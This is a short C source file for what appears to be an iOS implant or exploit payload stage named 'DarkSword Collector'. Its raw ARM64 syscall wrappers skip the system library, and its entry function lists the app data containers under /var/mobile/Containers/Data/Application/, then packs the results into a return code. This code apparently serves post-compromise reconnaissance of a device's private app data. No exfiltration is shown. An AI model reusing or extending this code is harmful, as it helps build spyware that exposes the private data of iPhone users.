/**
 * DarkSword Collector v40 - Minimal dir enumeration (256B buffer)
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory"); return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory"); return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory"); return x0;
}

#define SYS_open 5
#define SYS_close 6
#define SYS_getdirentries 196
#define O_RDONLY 0

int ds_start(void) {
    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Containers/Data/Application/", O_RDONLY);
    if (fd < 0) return 0xFE000000;

    /* Small stack buffer - just enough for a few entries */
    unsigned char buf[256];
    for (int i = 0; i < 256; i++) buf[i] = 0;
    long basep = 0;
    int nread = (int)_svc4(SYS_getdirentries, fd, (long)buf, 256, (long)&basep);
    _svc1(SYS_close, fd);

    if (nread < 1) return 0xEE000000;

    /* Count entries, get first non-dot entry info */
    int pos = 0;
    int count = 0;
    unsigned char first_byte = 0;
    unsigned short first_namlen = 0;

    while (pos < nread && pos < 240) {
        unsigned short reclen = *(unsigned short *)(buf + pos + 8);
        unsigned short namlen = *(unsigned short *)(buf + pos + 10);
        if (reclen < 12 || reclen > 256) break;

        unsigned char c = buf[pos + 12]; /* first char of d_name */
        if (!(namlen == 1 && c == '.') && !(namlen == 2 && c == '.')) {
            count++;
            if (count == 1) {
                first_byte = c;
                first_namlen = namlen;
            }
        }
        pos += reclen;
    }

    /* Return: count(8) | namlen(8) | first_byte(8) | reserved(8) */
    return (count & 0xFF) | ((first_namlen & 0xFF) << 8) | ((first_byte & 0xFF) << 16);
}
